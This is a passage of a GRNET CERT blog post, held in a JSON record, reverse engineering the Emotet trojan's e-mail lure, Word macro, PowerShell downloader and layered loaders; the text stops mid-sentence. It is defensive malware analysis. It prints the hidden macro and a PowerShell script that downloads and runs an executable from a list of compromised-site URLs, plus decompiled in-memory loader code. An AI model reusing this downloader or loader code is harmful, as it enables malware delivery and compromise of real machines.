{
    "id": "16d8e035-b078-49b6-a0e0-b0abc3f0fdef",
    "created_at": "2023-01-12T15:05:37.772738Z",
    "updated_at": "2025-03-27T02:05:25.268743Z",
    "deleted_at": null,
    "sha1_hash": "01e138b328ed775b3c196fa322747ed0d7677727",
    "title": "2021-02-08 - Reverse engineering Emotet – Our approach to protect GRNET against the trojan",
    "authors": "",
    "file_creation_date": "2022-05-28T04:02:56Z",
    "file_modification_date": "2022-05-28T04:02:56Z",
    "file_size": 5193504,
    "plain_text": "# Reverse engineering Emotet – Our approach to protect GRNET against the trojan\n\n**cert.grnet.gr/en/blog/reverse-engineering-emotet/**\n\nBy Dimitris Kolotouros and Marios Levogiannis\n\n## Preamble\n\nIn October 2020 we observed an outbreak of malicious e-mails reaching GRNET employees’\ninboxes. Meanwhile, similar campaigns were also targeting several public and private sector\norganizations in Greece. After acquiring dozens of such e-mails, we started planning our\ndefensive strategy. To do so, we started analyzing the malware that was attached to the\nemails and realized that were dealing with the infamous Emotet trojan.\n\nIn this document, we describe the steps of our analysis including the reverse engineering\nprocess of the malware executables, how we overcame the binary obfuscation techniques it\nemployed, and how we determined the malware’s internals. In the course of our work, we\nwere able to discover the list of IP addresses that constituted the network of Command-andControl (C2) servers of Emotet. This information was very useful because we utilized it to\ndetect any network connections from the GRNET network to the Emotet C2 network. Such\nconnections would indicate a potential compromised workstation in our premises. Overall,\nthe goals of our analysis were to (a) create an infrastructure that received new updates of the\nEmotet trojan and keep our list of C2 IP addresses up-to-date and (b) understand the trojan’s\npersistence mechanism to perform forensic invastigations on compromised workstations.\n\n\n-----\n\n[On January 27, 2021 Europol announced that it had completely taken down Emotet. The](https://www.europol.europa.eu/newsroom/news/world%E2%80%99s-most-dangerous-malware-emotet-disrupted-through-global-action)\nsame day our update-monitoring infrastructure received an update which was Europol’s\nclean-up payload scheduled to be executed on April 25, 2021 at 12:00 p.m.. Hopefully, this\nwill be the last time that we hear about Emotet. Meanwhile, we had been working on\nanalyzing Emotet up to the time of Europol’s announcement. We release our analysis results\nhoping that IT professionals will find them useful when trying to protect against similar trojans\nin the future.\n\nIn [Chapter 1 we describe the malicious e-mails and the malware dropper (a macro-enabled](https://cert.grnet.gr/en/blog/reverse-engineering-emotet/#Chapter_1_From_the_e-mails_to_the_binaries)\nMS Word document) delivered via those e-mails. If you are already familiar with Emotet’s\n[dropper you may directly skip to the next chapters. In Chapter 2 we analyze the malware’s](https://cert.grnet.gr/en/blog/reverse-engineering-emotet/#Chapter_2_From_the_Protector_to_the_Trojan)\nmulti-layer Protector responsible for unpacking, decrypting and running the trojan for the first\ntime. In [Chapter 3 we describe the binary obfuscation techniques incorporated in the trojan](https://cert.grnet.gr/en/blog/reverse-engineering-emotet/#Chapter_3_Overcoming_the_malware_obfuscation_techniques)\nitself as well as the ways to bypass them. In [Chapter 4 we provide an in-depth description of](https://cert.grnet.gr/en/blog/reverse-engineering-emotet/#Chapter_4_The_trojans_internals)\nthe trojan’s inner-workings, its persistence mechanism, the communication with the\nCommand-and-Control servers network and the way we discovered the C2 network. Finally,\nin [Chapter 5 we briefly describe the process we followed to retrieve and analyze new](https://cert.grnet.gr/en/blog/reverse-engineering-emotet/#Chapter_5_Monitoring_the_updates)\npayloads served by the C2 network.\n\nWe have published the de-compiled code of referenced functions as well as the utilities that\n[we implemented during the analysis in a GitHub repository.](https://github.com/grnet/emotet-utils)\n\nThis work was carried out under the supervision of GRNET’s Chief Information Security\nOfficer, Dimitris Mitropoulos.\n\nDimitris Kolotouros – Head of IT Security Department, GRNET\nMarios Levogiannis – Senior IT Security Engineer, GRNET\n\nFigure 0. Emotet stages overview\n\n## Chapter 1. From the e-mails to the binaries\n\n### Introduction\n\n\n-----\n\nOctober 2020.\n\nSeven months have passed since the first COVID-19 lockdown in Greece. The pandemic\nfinds GRNET with a largely broadened IT Security agenda heavily linked with the state’s\ncurrent digital transformation (involving several new applications being developed and\nmaintained in house). The aforementioned developments, together with the work-from-home\nstyle that has just arrived, completely redefined the security perimeter and priorities of\nGRNET CERT. A new era comes with new challenges.\n\nSomewhere in between the various ongoing tasks, a number of weird looking e-mails that\nreached GRNET employees came to our notice. They all had a similar form, i.e., replies to\nlegitimate mails that either contain a URL or an encrypted ZIP attachment and its password.\n\n### The e-mails\n\nFirst, to raise awareness, we notified all GRNET employees. Then, we started collecting and\nanalyzing the suspicious e-mails. Initially, we inspected their source code looking for\nsimilarities.\n\n\n-----\n\n-----\n\nFigure 1. E-mails delivering Emotet dropper via URL (left) and attachment (right)\nOur analysis led to several interesting remarks:\n\nAll e-mails were replies to legitimate e-mails. The e-mail subject followed a specific\npattern, i.e., “Re: <ORIGINAL MAIL SUBJECT>”. Also, the e-mail body contained the\nquoted original e-mail body.\nThe sender’s display name was altered to be the same with that of the original e-mail.\nHowever, the sender’s e-mail address was some unrelated e-mail address (several\ncompromised e-mail accounts were used).\n\n\n-----\n\nThe body of the reply contained either a URL or an attachment.\n\nIn the case of the URL, the text contained a legitimate domain name (e.g.\ngmail.com). Nevertheless, the actual target was completely different. Our\ninvestigation indicated that they were compromised websites used by the\nattackers to host the malicious documents.\nIn the case of the attachment we observed encrypted ZIP files with the\ncorresponding password contained in the reply body. Note that password\nencrypted attachments are commonly used to bypass any malware detection\nrunning on e-mail servers.\nFinally, in all cases we ended up with MS Word documents.\n\n### The MS Word documents\n\nUp to this point, we had already been informed about similar cases affecting other public and\nprivate sector organizations in Greece. Thus, a conventional incident response was not\nenough; we wanted to further analyze the malware.\n\nOur analysis started with the Word documents. When opening one of the documents, the\nvictim sees a fake pop-up window. In fact, this is just an image inside the document imitating\na legitimate pop-up window. In each document the fake pop-up window phrasing was\ndifferent, but in every case it was there to persuade the victim to enable the Macro execution.\n\n\n-----\n\n-----\n\n-----\n\nFigure2. Fake MS Word pop-ups in Emotet dropper\nWe will continue by analyzing one of the MS Word documents. All other documents were\nsimilar to the one examined; albeit with minor differences.\n\n### The VBScript Macros\n\nTo see what would happen when a user enabled the macros, we examined the\ncorresponding VBScript. The entry-point `Document.Open() called function`\n```\nQ4hxwcihtett() of module Iauesnh6lzhaf :\n\n```\n\n-----\n\nFigure 3. The VBScript macro entry\npoint\nThe function code, as we observe below, was obfuscated:\n\nFigure 4. The main VBSript macro module\nWe started following the code flow manually to understand it. This manual process revealed\nthat most of the code was indeed irrelevant. Specifically, for each meaningful code\ninstruction, the obfuscation process had generated a bunch of meaningless instructions\nplaced before the meaningful one. So, most of the de-obfuscation effort was to identify each\nblock and isolate the meaningful code instruction out of the block.\n\nLuckily enough, the attackers had left some traces that were helpful for us. As we noticed,\ntheir obfuscating tool had a serious issue (nobody’s perfect). In particular, it did not apply the\nindentation of the original instruction on the instructions of the replacement block. As a result,\nthe original indentation could be found on the first instruction of each block. This issue gave\nus a way to automatically detect the blocks and isolate the last instruction of each block,\nwhich we knew it was the meaningful instruction of the block.\n\nThe following obfuscation techniques were identified:\n\n\n-----\n\nDeliberate run-time errors in junk instructions (which were ignored because of the `On`\n```\n   Error Resume Next statement),\n\n```\nString construction using one or more of the following:\n\nString concatenation,\nUse of undefined variables that resolve to empty strings,\nString replacements with the `Replace() function,`\nConversion of ASCII codes to strings with the `ChrW() function,`\nRetrieval of values from hidden user form control elements,\nAlteration between upper and lower case letters in symbol names, exploiting the case\ninsensitivity of Windows OS,\nUse of the line-continuation character `_ to break statements in multiple lines.`\n\nThen, we only had to manually de-obfuscate some lines of code (the original number of lines\nwas a little more than 400). The result was the following:\n```\n01: Rem Attribute VBA_ModuleType=VBADocumentModule\n02: Option VBASupport 1\n03: Private Sub Document_open()\n04:  Set storyRange = ThisDocument.StoryRanges.Item(1)\n05:  Set commandLine = Mid(storyRange, 5, Len(storyRange))\n06:  commandLine = Replace(commandLine, \"][ 1) jjkgS [] []w\", Empty)\n07:  Set objProcess = CreateObject(\"winmgmts:Win32_Process\")\n08:  Set objProcessStartup = CreateObject(\"winmgmts:Win32_ProcessStartup\")\n09:  objProcessStartup.ShowWindow = 0\n10:  objProcess.Create commandLine, Empty, objProcessStartup\n11: End Sub\n\n```\nHence, we were able to answer an important question: “What happens when the user\nexecutes this macro?”\n\nWell, it spawns a process calling the `Win32_Process.Create() method (line 10). The`\nstartup information parameter says “do not show a window” (line 9). Further, the command\nline parameter holds the command that will be invoked by the spawned process. As we can\nobserve in the code, the command is already in the document (lines 4-5) together with some\njunk that is removed (line 6).\n\nSo there was something more in the document itself apart from the fake popup window.\n\n### The PowerShell script\n\nFirst, we removed the formatting. In this way we revealed a paragraph that was kept out of\nthe victim’s sight (it was formatted with a font size of 2px and a white font color):\n\n\n-----\n\nFigure 5. Obfuscated PowerShell command hidden in document body\nThis looked obfuscated, too. But we already know how to de-obfuscate it, i.e.\n```\nReplace(commandLine, \"][ 1) jjkgS [] []w\", Empty) :\n\n```\nFigure 6. De-obfuscated PowerShell command\nThe result would attempt to run a PowerShell script that is encoded in base64 format. We\ndecoded it to discover the actual PowerShell script:\n\n\n-----\n\nFigure 7. Base64-decoded PowerShell script\nAfter performing a proper indentation, i.e. split lines on each ‘ ; ‘ and perform indentations\non code blocks ‘ { ‘ and ‘ } ‘, we got the following:\n\n\n-----\n\n```\n$1D2 [tYpE]( {3}{1}{4}{5}{0}{2} f ecTo, SteM., Ry, sy, Io., diR );\n$tJ8m4B =[TYpe](\"{2}{4}{5}{1}{3}{0}\"-f\n'r','iNTmAnAg','sYsteM.nE','e','T','.SerVIcEpO') ;\n$Ysa212g=('N'+('b7ib0'+'0'));\n$S95cz34=$I0phsdk + [char](64) + $Ixdbxto;\n$Qdfg2cp=(('Chns'+'7')+'2'+'d');\n(dIR variABle:1D2).valuE::\"CR`eAteDir`ectory\"($HOME + ((('8U'+'L')+('Pj'+'q')+\n('6t3'+'_8UL'+'Jvn'+'k')+('7'+'yk')+('8U'+'L')).\"R`e`place\"(('8'+'UL'),'\\')));\n$Qo08jci=('F'+'5'+('ocx'+'ex'));\n( ITEM vARIAblE:Tj8M4B ).VAlUe::\"SeC`U`RI`TyPRoTOc`OL\" = (('Tl'+'s1')+'2');\n$R7w053i=(('Nue'+'l2')+'4'+'k');\n$Tedbr00 = ('N'+'1p'+('jur'+'3u'));\n$H_8yni0=('J6'+'a'+('f'+'fv6'));\n$Roz09dp=('V'+('t9'+'1oph'));\n$Glkvf7b=$HOME+(('{0'+'}Pjq6'+'t'+'3_'+'{0'+'}Jvnk7yk{0}') -F[Char]92)+$Tedbr00+\n('.e'+'xe');\n$Ads4mxg=(('E'+'2n')+'0j'+'qo');\n$Q4b1g5n=.('new-o'+'b'+'jec'+'t') nEt.WEBcLieNt;\n$Boiep01=((('ht'+'tp:]['+' ')+'1'+((') '))+'jj'+(('kgS [] []w'+']['+' 1)'+' '))+\n('jj'+'kgS []')+(' []wi'+'nnh')+('anma'+'chn.')+(('com]'+'[ 1) '))+'j'+('jkgS'+'\n[]')+(' []'+'w')+'wp'+('-'+'adm')+(('in][ '+'1)'+' j'))+('j'+'kg')+('S []'+'\n[]')+'w'+('sA'+']')+'['+((' 1'+') jjkg'+'S'))+' '+'['+('] '+'[')+']w'+'@h'+\n(('ttp:'+']'+'[ '+'1) jj'))+('k'+'gS ')+('[]'+' ')+'['+']'+(('w]['+' 1)'))+('\nj'+'j')+('kgS []'+' []'+'wsh')+'om'+'al'+('house'+'.co')+('m]'+'[')+' 1'+((')'+'\njjkg'))+('S '+'[]')+(' []wwp-'+'in'+'c'+'lu')+'de'+('s'+'][')+' 1'+((') '))+\n('j'+'jk')+'g'+'S '+('[]'+' [')+(']w'+'I')+('D3'+'][')+' 1'+')'+(' jjk'+'g')+('S\n'+'[]')+' '+(('['+']wI'+'Dz][ 1)'))+(' jjkg'+'S')+' '+('[] '+'['+']w@h')+\n('ttp'+':]'+'[ ')+(('1)'))+(' '+'jjkgS '+'[] ')+('[]'+'w][')+((' '+'1)'))+('\n'+'jjk')+('g'+'S []')+(' ['+']')+'wb'+'lo'+('g'+'.ma')+('r'+'tyr')+('ol'+'ni')+\n('ck.'+'com')+']'+('['+' 1')+((')'+' j'))+'jk'+('gS'+' [] '+'[')+(']wwp'+'-'+'adm')+\n('in'+']')+(('[ 1) '+'jj'))+'k'+('gS ['+'] ')+('['+']wS')+('pq]'+'[ 1')+((')\n'))+'j'+'jk'+('gS [] []'+'w'+'@htt')+'p'+'s:'+']'+(('[ '+'1) j'+'jkgS '))+'[]'+' '+\n('['+']w]')+'['+' 1'+((') '))+'jj'+('kgS [] ['+']wwww'+'.f')+'r'+\n('ajamom'+'ad'+'ri'+'d.c'+'om')+(']'+'[ 1')+((') j'+'j'))+'kg'+'S '+('[] ['+']w')+\n('wp'+'-')+('cont'+'e')+('nt'+']')+'[ '+'1'+((')'+' j'))+('jk'+'g')+'S'+(' ['+']')+('\n'+'[]wg]')+(('[ 1)'+' j'+'jkg'))+'S '+('[]'+' ')+('['+']w@h')+'tt'+(('p'+'s:'+'][\n1'+') '+'jjk'+'gS [] '))+('[]w]['+' ')+(('1)'+' '))+('jjkg'+'S ['+']')+' ['+']w'+\n('p'+'esqui')+('s'+'ac')+'re'+'d'+(('.'+'com][ 1) jj'+'k'))+'g'+'S '+'[]'+('\n[]w'+'vmw')+('ar'+'e-unl')+('ock'+'e')+('r'+'][ 1')+((') '))+('j'+'jk')+'g'+('S ['+']\n')+('['+']w')+'da'+'C'+']'+'['+((' '+'1) '+'jj'))+('kg'+'S')+' '+('[]'+'\n')+'[]'+'w'+'@'+('ht'+'tp')+'s:'+']['+((' 1)'+' '))+'j'+'j'+('k'+'gS')+(' ['+']')+('\n['+']')+('w][ '+'1')+')'+' '+('jj'+'kgS ')+'['+(']'+' []wme')+'d'+('h'+'em')+\n(('pfa'+'rm.c'+'om]'+'[ 1)'))+' '+('jj'+'kg')+('S'+' [] [')+(']wwp'+'-a')+'dm'+\n('in'+']')+'['+' '+'1'+((') jjkgS ['+']'+' []w'+'L'))+'b'+(('][ 1'+') jj'))+\n('k'+'gS'+' []')+' '+'[]'+'w'+'@h'+('t'+'tp:][ 1')+')'+(' j'+'jkgS []'+' ')+'['+\n(']w]'+'[')+((' 1'+')'))+(' '+'jj')+('kg'+'S []'+' []')+'w'+('ien'+'g')+\n('li'+'sha')+'bc'+('.c'+'o')+(('m]['+' 1)'+' j'))+('jk'+'gS')+((' '+'[]'+'\n['+']wc'+'ow][ 1'+') '))+'jj'+'k'+('gS'+' ')+'['+']'+(' '+'[]')+('w2B'+'B')+(('][\n'+'1)'))+' '+'j'+('jk'+'g')+('S '+'[] ')+'[]'+'w')).\"R`ep`lacE\"(((']['+((' '+'1)\njjkg'+'S []'))+' '+('[]'+'w'))),([array]('/'),('x'+'we'))[0]).\"S`PliT\"($Od7ccw9 +\n$S95cz34 + $On55ljg);\n$Q9eccc5=(('F'+'o4')+'g'+('2'+'rk'));\nforeach ($S7m_bsh in $Boiep01){\n  try{\n    $Q4b1g5n.\"d`oWnL`Oa`DfIlE\"($S7m_bsh, $Glkvf7b);\n\n```\n\n-----\n\n```\n    $E4fktea ( D + li +( 0 + 4n_ ));\n    If ((&('Get'+'-Ite'+'m') $Glkvf7b).\"l`e`Ngth\" -ge 47912) {\n      ([wmiclass]('wi'+('n'+'32')+'_P'+('r'+'ocess'))).\"CR`e`AtE\"($Glkvf7b);\n      $Klmmlcr=(('V6z'+'43'+'q')+'d');\n      break;\n      $Myse8pt=('S8'+('266j'+'7'))\n    }\n  } catch{\n  }\n}\n$Xwnf9b5=('R_'+('1kl'+'w')+'o')\n\n```\nWe then noticed some common obfuscation techniques:\n\nString formatting to scramble string elements (e.g. `{3}{1}{4}{5}{0}{2}\"-f`\n```\n   'ecTo','SteM.','Ry','sy','Io.','diR' ),\n\n```\nInsertions of the word-wrap operator ( ` ) in symbol names (e.g. `d`oWnL`Oa`DfIlE ),`\nAlteration between upper and lower case letters in symbol names exploiting the case\ninsensitivity of Windows OS (e.g. `nEt.WEBcLieNt ),`\nString construction with concatenation and junk removal with the `Replace() method,`\nUse of undefined variables in string concatenations that actually act as empty strings,\nand\nInsertion of irrelevant code instructions.\n\nWe then used a PowerShell interpreter to evaluate strings and after removing irrelevant\ninstructions and renaming the variables, we had the de-obfuscated code:\n```\nSystem.IO.Directory::CreateDirectory($HOME + \"\\\\Pjq6t3_\\\\Jvnk7yk\\\\\");\nSystem.Net.ServicePointManager::SecurityProtocol = \"Tls12\";\n$filepath = $HOME + \"\\\\Pjq6t3_\\\\Jvnk7yk\\\\N1pjur3u.exe\";\n$webclient = New-Object System.Net.WebClient;\n$urls = \"http://in*******hn.com/wp-admin/sA/\",\n  \"http://sh*******se.com/wp-includes/ID3/IDz/\",\n  \"http://blog.ma********ck.com/wp-admin/Spq/\",\n  \"https://www.fr*********id.com/wp-content/g/\",\n  \"https://pe********ed.com/vmware-unlocker/daC/\",\n  \"https://me*******rm.com/wp-admin/Lb/\",\n  \"http://ie*******bc.com/cow/2BB/\";\nforeach ($url in $urls) {\n  try {\n    $webclient.DownloadFile($url, $filepath);\n    If ((Get-Item $filepath).Length -ge 47912) {\n      ([wmiclass](\"Win32_Process\")).Create($filepath);\n      break;\n    }\n  } catch {}\n}\n\n```\n\n-----\n\nThe outcome was a script that was pretty simple. Actually, it attempts to download an\nexecutable file from several URLs and store it in the following path:\n```\n$HOME\\Pjq6t3_\\Jvnk7yk\\N1pjur3u.exe (the URLs and the path were different in each\n\n```\nWord document). The size of each downloaded file is checked against a minimum value to\nensure that if the executable has been removed from the compromised website, the 404\nHTML page will be ignored and the next URL will be tried. When a file has been downloaded,\nit gets executed in a new process by calling the `Win32_Process.Create() method.`\n\nAfter following the same de-obfuscation procedure on every Word document available, we\nfetched the actual malware executables from the URLs described in the PowerShell scripts.\nTo do so, we imitated the PowerShell User-Agent in a way; we needed to look like a\nmalicious PowerShell script after all!\n\nPS. During the course of our analysis we came across several compromised e-mail accounts\nand websites. In all cases, we sent abuse reports to the corresponding abuse contacts\ninforming them of their compromised assets.\n\n## Chapter 2. From the protector to the trojan\n\n### Introduction\n\nIn the previous chapter we documented the detection and preliminary analysis of a malware\nthat was distributed via e-mails. We saw that the e-mails included an MS Word document\nwith macros that spawn a new process running a PowerShell script in the victims machine.\nWe also observed that the PowerShell script spawns one more process running an\nexecutable file downloaded from the Internet. Finally, we downloaded several of those\nexecutable files.\n\nWith the executable files at hand, we wanted to examine their internals without running them.\nThus, we continued with our reverse engineering process. At this point we started working\nwith Ghidra, a free, open-source, reverse engineering tool that was released last year.\n\n### The executable files\n\nFirst, we loaded some of the executable files and observed that they were PE (Portable\nExecutable) files compiled for the x86 LE architecture.\n\n\n-----\n\nFigure\n\n8. Emotet Protector’s architecture details\nWe started looking for meaningful data such as imported symbols and defined strings. To our\nsurprise we observed a number of different programs. Also, we noticed that in every\nexecutable file there was one defined string looking like a random key.\n\n\n-----\n\n-----\n\n-----\n\n-----\n\nFigure 9. Random keys in various Emotet Protectors’ strings\nApart from that, all the other strings seemed to differ between the executable files. Assuming\nthat this is not a coincidence, we looked for references to these strings in the de-compiled\ncode. While looking, we noticed one more similarity: although the surrounding code also\nseemed to differ between the executable files, there was an identical code pattern that\nconsumed the alleged key.\n\n\n-----\n\n-----\n\n-----\n\n-----\n\nFigure 10. Code referencing the keys in various Protectors\nWe reverse engineered this part of the code, and ended up with the following code:\n\n\n-----\n\n```\nWPARAM FUN_00407b2e(HINSTANCE param_1,int param_2)\n{\n byte *resourceBuffer;\n _LDR_RESOURCE_INFO resourceInfo;\n _IMAGE_RESOURCE_DATA_ENTRY *ResourceDataEntry;\n void *resource;\n word iv;\n dword resourceSize;\n...\n  resource = (void *)0x0;\n  resourceSize = 0;\n  resourceInfo.Type = 10;\n  resourceInfo.Name = 0x1e55;\n  resourceInfo.Language = 0x409;\n...\n _LdrFindResource_U_PTR =\nGetProcAddress(s_ntdll_Module2,s_LdrFindResource_U_0040d8cc);\n...\n  _LdrAccessResource_PTR =\nGetProcAddress(s_ntdll_Module2,s_LdrAccessResource_0040d8b4);\n  iVar3 = (*_LdrFindResource_U_PTR)(0x400000,&resourceInfo,3,&ResourceDataEntry);\n  if (-1 < iVar3) {\n   (*_LdrAccessResource_PTR)(0x400000,ResourceDataEntry,&resource,&resourceSize);\n  }\n  resourceBuffer = (byte *)VirtualAlloc((LPVOID)0x0,resourceSize,0x1000,0x40);\n  memcpy(resourceBuffer,resource,resourceSize);\n  DeriveKey(s_*FLrY4bO%4Th$J8Gt0z*zKiB)Yb#mGNy_0040d5b4,0x57,(uint)&iv);\n  DecryptResource(resourceBuffer,resourceSize,&iv);\n  (*(code *)resourceBuffer)();\n...\n}\n\n```\nThe code above has the following functionality:\n\nAllocates an executable memory region with `VirtualAlloc(), where` `0x40`\ncorresponds to `PAGE_EXECUTE_READWRITE protection level,`\nloads a specific resource from the executable’s resources into this region,\nderives a decryption key from the previously mentioned main key,\ndecrypts the contents of the resource using the derived key, and finally,\nuses the reference to the decrypted data as a function pointer and calls the function.\n\nIn [deriveKey.c and](https://github.com/grnet/emotet-utils/blob/master/decompiled/deriveKey.c) [decryptResource.c we include the reverse engineered code of the](https://github.com/grnet/emotet-utils/blob/master/decompiled/decryptResource.c)\nfunctions.\n\nThe attackers hid the actual payload in the resource described by the\nfollowing `RESOURCE_INFO variable:`\n```\nresourceInfo.Type = 10;\nresourceInfo.Name = 0x1e55;\nresourceInfo.Language = 0x409;\n\n```\n\n-----\n\nWe found the payload in the resources section of the executable file, just below this mouse\nicon:\n\nFigure 11. The encrypted payload in Emotet Protector’s resources\nAt that point we had the encrypted payload, the main key, the key derivation function and the\ndecryption function. The only thing left was to decrypt the payload. So we reused the\nreversed engineered `DeriveKey() and` `DecryptResource() functions to write a small`\ndecryption tool. After that we were able to decrypt the resource.\n\n### The decrypted resource\n\nLoading the decrypted resource in Ghidra was not just a drag-n-drop task. Apparently, there\nwere no executable headers to let Ghidra infer the architecture details. However, we knew\nthat this payload was loaded in the memory space of the initial executable so we only had to\ndefine the architecture to be the same as the initial executable. Furthermore, we knew that\nthe executable starts with a function (the pointer to the memory was handled as a function\npointer as previously described). With a little manual work, we managed to analyze the\npayload with Ghidra:\n\n\n-----\n\nFigure 12. The decrypted resource’s entry-point\nAs shown above, the code pushes some values in the stack and then calls function\n```\nFUN_0000002d() . The values pushed in the stack must be the function arguments. Among\n\n```\nthese values we noticed `0x529 and` `0x31529 which Ghidra analyzed as memory`\nreferences ( DAT_0000052e and `DAT_0003152e ).`\n```\nDAT_0003152e contains the last 5 bytes of the executable representing the null-terminated\n\n```\nstring “ dave ” that looked like a magic value.\n\nFigure 13. The referenced DAT_0003152e in decrypted resource\n```\nDAT_0000052e was more interesting. The first two bytes were the printable characters\n\n```\n“MZ”. As you probably know this is the header signature of DOS MZ executables. This was a\nvery good lead.\n\nThe file can be identified by the ASCII string “MZ” (hexadecimal: 4D 5A) at the\nbeginning of the file (the “magic number”). “MZ” are the initials of Mark Zbikowski, one\nof leading developers of MS-DOS.\n\n_[Wikipedia](https://en.wikipedia.org/wiki/DOS_MZ_executable)_\n\n\n-----\n\nFigure 14. The MZ magic value in the decrypted resource\nBy further examining the contents of `DAT_0000052e, we identified some known MS-DOS`\nstub strings, such as the “This program cannot be run in DOS mode”. Of course this\nresembles a PE executable.\n\nFigure 15. The MS-DOS stub in the decrypted resource\nWe went on reversing the `FUN_0000002d() function assuming that its first argument is a`\nreference to a PE executable.\n\n\n-----\n\nThe first difficulty was the mysterious function named `FUN_00000456() . This function is`\ninvoked several times at the beginning of `FUN_0000002d() with a different argument each`\ntime. The return values are stored on local variables and later on they are used as function\npointers. Apparently, the function somehow resolved these arguments to function addresses.\nThus we needed to reverse engineer `FUN_00000456() .`\n\nFigure 16. Symbol resolving in the decrypted resource’s code\nExamining `FUN_00000456(), we came across a technique for resolving library symbols.`\nSpecifically, the function retrieves the list of loaded libraries ( InLoadOrderModuleList )\nfrom the Process Environment Block (PEB) and loops over each exported symbol of each\nlibrary. On each loop a combined hash (32-bit value) of the library name and symbol name is\ncalculated. If this value matches the function argument, a pointer to the address of the\n[corresponding function is returned (in resolveImportByHash.c we include the reverse](https://github.com/grnet/emotet-utils/blob/master/decompiled/resolveImportByHash.c)\nengineered code of the function). As soon as we understood the internals of the hashing\n[mechanism, we wrote a short script, generate_symbol_hashes1.py, that calculates these](https://github.com/grnet/emotet-utils/blob/master/utilities/generate_symbol_hashes1.py)\nhash values for every symbol of several common libraries ( ntdll.dll, `kernel32.dll,`\netc) and exports them to a proper (and long) C enumeration:\n\n\n-----\n\nFigure 17. Calculated symbol hashes enumeration\nAfter importing the generated enum in our Ghidra project (and properly retyping the function),\nwe had a clear view of which library functions are called later on:\n\nFigure 18. Reverse engineered symbol resolving\nWe were now able to continue reversing the `FUN_0000002d() function. After some good`\namount of analysis we concluded that the function is a pretty basic binary image loader with\n[the following function signature (in loadBinary.c we include the complete reverse engineered](https://github.com/grnet/emotet-utils/blob/master/decompiled/loadBinary.c)\ncode):\n```\nbyte * loadBinary(byte *pe_ptr,byte *functionToRunHash,byte *functionToRunParam1, int\nfunctionToRunParam2,int copyDosHeader)\n\n```\nInternally, the function:\n\nallocates the memory buffer (in which the image will be loaded) with\n```\n   VirtualAlloc(),\n\n```\ncopies the headers from the source image,\ncopies the sections from the source image,\nloads and links the imported symbols (libraries),\napplies the relocations,\n\n\n-----\n\napplies proper memory protection to each section with `VirtualProtect() (that way`\nthe executable sections of the loaded binary will be in executable memory sections),\nruns the executable’s entry-point,\nruns an exported symbol, the name of which matches the `functionToRunHash hash`\nvalue, passing the parameters `functionToRunParam1 and` `functionToRunParam2,`\nreturns a pointer to the allocated buffer.\n\nThe code at the beginning of the encrypted payload could now be translated into something\nmeaningful:\n\nFigure 19. Reverse\n\nengineered entry-point\nIn this way, we knew that the executable included at address `0x0000052e will be loaded.`\nThen, the entry-point is invoked:\n\nFigure 20.\n\nReverse engineered code running the nested binary\nWhen the entry-point returns, its exported symbol, i.e., an exported function with a name\nmatching the `0xed1c7b90 hash value, will run.`\n\nWe exported the executable included at address `0x0000052e in a separate file and loaded`\nit into Ghidra.\n\n### The nested executable\n\nWe loaded the nested executable in Ghidra and went straight to the entry-point. The entrypoint just calls a function with a couple of parameters.\n\nFigure 21.\n\nThe nested executable’s entry-point\nYou might wonder what is this `DAT_10004070 value. So did we. As a result, we had a quick`\nlook into its contents:\n\n\n-----\n\nFigure 22. MZ magic\n\nvalue in the nested executable\nThat “MZ” signature on the right looks familiar, doesn’t it? Well, this is another nested PE\nexecutable! It was like opening a matryoshka doll.\n\nWe reverse engineered the `FUN_10001000() function and, as you can probably guess, it`\nwas yet another binary image loader with the following function signature:\n```\nstruct_paramContainer * __cdecl loadBinary(byte *pe_ptr,uint pe_size)\n\n```\nInternally, it performs the following tasks:\n\nallocates the memory buffer (in which the image will be loaded) with\n```\n   VirtualAlloc(),\n\n```\ncopies the headers from the source image,\nfixes the relocation table entries according to the offset between the allocated buffer\naddress and the `ImageBase,`\nloads and links the imported symbols (libraries),\ncopies the sections from the source image and applies proper memory protection to\neach section with `VirtualProtect() (that way the executable sections of the loaded`\nbinary will be in executable memory),\ninitializes the Thread Local Storage (TLS) according to the image TLS Section,\nmodifies the base addresses ( ImageBaseAddress and `LoaderData-`\n```\n   >InLoadOrderModuleList->DllBase ) of Process Environment Block (PEB) so that\n\n```\nthey point to the allocated buffer\n\n\n-----\n\nruns the executable s entry-point.\n\nFigure 23. Reverse\n\nengineered code running the actual trojan\nOnce again we exported the executable included at address `0x10004070 in a separate file`\nthat we had to explore.\n\n## Chapter 3. Overcoming the malware obfuscation techniques\n\n### Introduction\n\nIn the previous chapter, we explored the steps until the actual trojan is executed. We\nobserved that the downloaded executable, decrypts part of itself and executes the second\nstage payload. This payload in turn, executes another payload, i.e. the executable that we\nwill analyze in this chapter and Chapter 4.\n\nIn this Chapter, we’ll fast-forward and describe the obfuscation techniques employed by the\nlatter executable. This will provide us with the necessary background to further explain its\nfunctionality in Chapter 4.\n\n### Symbol Resolution Obfuscation\n\nThe first thing that we noticed after loading the executable in Ghidra was that it does not\nimport any symbols. In particular, it is not feasible for an executable of only 369 KB, to have\na Windows API implementation statically linked. Hence, it became obvious that it was\nprobably using a custom mechanism to resolve symbols from system libraries.\n\nFigure 24. Emotet trojan’s Symbol Tree\n\n\n-----\n\nStarting from the entry-point, we noticed the following lazy initialization pattern, the result of\nwhich is stored in a global variable and is used as a function pointer. The same pattern (and\nsome variations of it) is used all over the executable.\n\nFigure 25. Symbol resolving in\n\nEmotet trojan’s entry-point\nCould this be the custom symbol resolution mechanism employed by the trojan to hide the\nAPIs that it uses? To find out, we reversed engineered functions `FUN_00404190() and`\n```\nFUN_004040f0() . Indeed, these two functions work almost like FUN_00000456()\n\n```\ndescribed in Chapter 2:\n```\n   FUN_00404190() starts from the Thread Information Block (the address of which is\n\n```\navailable from the `FS segment register on 32-bit Windows), accesses the Process`\nEnvironment Block (PEB) and iterates over the list of loaded modules\n( InLoadOrderModuleList ). For each module, it calculates the hash of its lowercased name and compares it against the specified parameter. If they match, the\nfunction returns the module’s base address. Essentially, it works like\n```\n   GetModuleHandle(), but instead of specifying the module’s name, the caller\n\n```\nspecifies the module name’s hash.\n```\n   FUN_00000456() parses the module specified in the first parameter to find its export\n\n```\ntable and iterates over the exported symbols. For each exported symbol, it calculates\nthe hash of its name and compares it against the value specified in the second\nparameter. If they match, it either returns the address that the symbol points to (if the\nsymbol is an export) or recursively resolves the symbol forwarded from another module\n(if the symbol is a forwarder).\n\n[This technique is called API Hashing. In findModuleByHash.c](https://github.com/grnet/emotet-utils/blob/master/decompiled/findModuleByHash.c)\n[and findModuleExportByHash.c we include the reverse engineered code of the 